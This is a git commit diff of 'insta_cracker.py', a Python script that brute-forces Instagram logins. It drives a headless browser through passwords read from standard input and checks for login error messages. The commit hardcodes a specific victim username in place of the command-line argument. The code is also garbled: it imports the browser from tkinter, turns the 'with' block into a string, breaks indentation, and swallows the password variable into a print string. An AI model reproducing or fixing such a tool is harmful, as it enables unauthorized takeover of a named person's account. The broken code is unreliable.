8f63086f5549cfd14a89a1f3db518cafdc7b9e98
damonbagheri <127343560+damonbagheri@users.noreply.github.com>
2023-03-15 20:47:15 +0330

    damon

--- insta_cracker.py
+++ insta_cracker.py
@@ -2,24 +2,24 @@
 from tkinter import Browser
 import time
 import sys
-from tkinter import BROWSE
+from tkinter import Browser
 wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
 problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."
 
-def logInSuccess(browser):
+def logInSuccess(Browser):
     user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
     pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
-    return not(browser.is_text_present(user_err_msg) or browser.is_text_present(pass_err_msg))
+    return not(Browser.is_text_present(user_err_msg) or Browser.is_text_present(pass_err_msg))
 
 ("account_username =sys.argv[1]")
-with BROWSE('firefox', headless=True) to  BROWSE('chrome', headless=True)
-    Browser.visit('https://www.instagram.com')
-    Browser.find_by_text("Log in").first.click()
-    username_form = Browser.find_by_name('username').first
-    password_form = Browser.find_by_name('password').first
-    login_button = Browser.find_by_text('Log in').first
-    username_form.fill(account_username)
-    for password in sys.stdin:
+"with Browser('firefox', headless=True) to with Browser('chrome', headless=True)"
+Browser.visit('https://www.instagram.com')
+Browser.find_by_text("Log in").first.click()
+username_form = Browser.find_by_name('username').first
+password_form = Browser.find_by_name('password').first
+login_button = Browser.find_by_text('Log in').first
+username_form.fill("istanbul_solmaz")
+for password in sys.stdin:
         if len(password) < 6:
             print('Skipping password: ' + password)
             continue
@@ -36,9 +36,9 @@ with BROWSE('firefox', headless=True) to  BROWSE('chrome', headless=True)
         elif logInSuccess(Browser):
             correctPassword = password
             break
-    if correctPassword == None:
+if correctPassword == None:
         print("Unable to find correct password.")
-    else:
-        print("Password for username:" + account_username + " = " + password)
+else:
+        print("Password for username: istanbul_solmaz  =  + password")
 
 
